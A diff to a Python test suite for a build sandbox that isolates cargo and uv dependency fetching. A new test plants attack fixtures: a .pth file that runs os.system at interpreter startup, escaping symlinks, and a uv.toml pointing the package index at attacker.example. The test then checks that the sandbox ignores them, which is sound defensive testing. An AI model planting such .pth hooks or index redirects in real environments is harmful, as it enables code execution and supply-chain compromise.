@@ -166,6 +166,8 @@ class Arguments(World):
         self.assertNotIn("readonly", uv[0])
         self.assertIn("CARGO_BUILD_RUSTC_WRAPPER=", envs(fetch))
         self.assertIn("CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER=", envs(fetch))
+        self.assertIn("UV_NO_CONFIG=1", envs(fetch))
+        self.assertFalse([m for m in mounts(fetch) if m.get("dst") == "/work/target"])
         self.assertIn(f"UV_CACHE_DIR={sandbox.UV_CACHE}", envs(fetch))
         self.assertIn(f"CARGO_HOME={sandbox.CARGO_HOME}", envs(fetch))
         run = self.phase_args(sandbox.Phase.RUN, checkout)
@@ -279,7 +281,7 @@ class Runner(World):
         for call in runs:
             for source, state in call["binds"].items():
                 with self.subTest(source=source):
-                    self.assertEqual(state, {"exists": True, "uid": UID})
+                    self.assertEqual((state["exists"], state["uid"]), (True, UID))
         for checkout in (first, second):
             self.assertTrue((checkout / "target").is_dir())
             self.assertTrue((checkout / ".venv").is_dir())
@@ -417,7 +419,7 @@ def command_of(argv: list[str]) -> list[str]:
 
 
 CARGO_FETCH = ["cargo", "fetch", "--locked"]
-UV_VENV = ["uv", "venv", "--python", "3.13", "/work/.venv"]
+UV_VENV = ["uv", "venv", "--managed-python", "--python", "3.13", "/work/.venv"]
 UV_INSTALL = [
     "uv", "pip", "install", "--python", "/work/.venv/bin/python", "--no-build",
     "--group", "crates/oxedi_py/pyproject.toml:dev",
@@ -432,44 +434,36 @@ class Fetch(World):
         return self.home / ".cache" / "oxedi-sandbox" / sandbox.path_hash(checkout) / "venv"
 
     def test_fetch_commands_fixed(self):
-        self.assertEqual(sandbox.fetch_commands(False), [CARGO_FETCH, UV_VENV, UV_INSTALL])
-        self.assertEqual(sandbox.fetch_commands(True), [CARGO_FETCH, UV_INSTALL])
+        self.assertEqual(sandbox.fetch_commands(), [CARGO_FETCH, UV_VENV, UV_INSTALL])
 
-    def test_fetch_runs_before_the_command(self):
-        result = self.sandbox(self.checkout())
-        self.assertEqual(result.returncode, 0, result.stderr)
-        runs = [c["argv"] for c in self.runs()]
-        self.assertEqual([command_of(a) for a in runs[:3]], [CARGO_FETCH, UV_VENV, UV_INSTALL])
-        self.assertEqual(command_of(runs[3])[:2], ["bash", "-c"])
-        for argv in runs[:3]:
-            self.assertNotIn("--network", argv)
-            self.assertIn("readonly", mount_at(argv, "/work"))
-        self.assertIn("sandbox: fetch took", result.stderr)
-
-    def test_fetch_keeps_a_current_venv(self):
+    def test_what_a_run_leaves_never_reaches_the_next_fetch(self):
         checkout = self.checkout()
-        venv = self.venv(checkout)
-        venv.mkdir(parents=True)
-        (venv / "kept").touch()
-        for version in ("3.13", "3.13.13"):
-            with self.subTest(version=version):
-                (self.fake / "calls.jsonl").unlink(missing_ok=True)
-                home = "home = /opt/python/cpython-3.13-linux-x86_64-gnu/bin"
-                (venv / "pyvenv.cfg").write_text(f"{home}\nversion_info = {version}\n")
-                self.assertEqual(self.sandbox(checkout).returncode, 0)
-                self.assertEqual([command_of(a) for a in self.fetches()], [CARGO_FETCH, UV_INSTALL])
-                self.assertTrue((venv / "kept").exists())
-
-    def test_fetch_replaces_a_venv_of_another_python(self):
-        checkout = self.checkout()
-        venv = self.venv(checkout)
-        venv.mkdir(parents=True)
-        (venv / "pyvenv.cfg").write_text("version_info = 3.12.9\n")
-        (venv / "stale").touch()
         self.assertEqual(self.sandbox(checkout).returncode, 0)
-        self.assertEqual([command_of(a) for a in self.fetches()], [CARGO_FETCH, UV_VENV, UV_INSTALL])
-        self.assertFalse((venv / "stale").exists())
+        clean = self.fetches()
+        venv = self.venv(checkout)
+        outside = self.tmp / "outside"
+        (outside / "keep").mkdir(parents=True)
+        site = venv / "lib" / "python3.13" / "site-packages"
+        site.mkdir(parents=True)
+        (site / "evil.pth").write_text("import os; os.system('touch /work/marker')\n")
+        (venv / "bin").mkdir()
+        (venv / "bin" / "python").symlink_to(outside / "keep")
+        (venv / "outside-link").symlink_to(outside)
+        (venv / "pyvenv.cfg").write_text("version_info = 3.13\n")
+        (checkout / "uv.toml").write_text('index-url = "https://attacker.example/simple"\n')
+        (checkout / ".python-version").write_text("3.11\n")
+        (self.fake / "calls.jsonl").unlink()
+        self.assertEqual(self.sandbox(checkout).returncode, 0)
+        planted = self.fetches()
+        self.assertEqual(planted, clean)
+        for argv in planted:
+            self.assertIn("UV_NO_CONFIG=1", envs(argv))
+            self.assertFalse([m for m in mounts(argv) if m.get("dst") == "/work/target"])
+            self.assertIn("readonly", mount_at(argv, "/work"))
+        first = [c for c in self.runs() if "bash" not in c["argv"]][0]
+        self.assertEqual(first["binds"][str(venv)]["entries"], [])
         self.assertTrue(venv.is_dir())
+        self.assertTrue((outside / "keep").is_dir())
 
     def test_fetch_failure_stops_without_offline_fallback(self):
         result = self.sandbox(self.checkout(), FAKE_FETCH_EXIT="101")
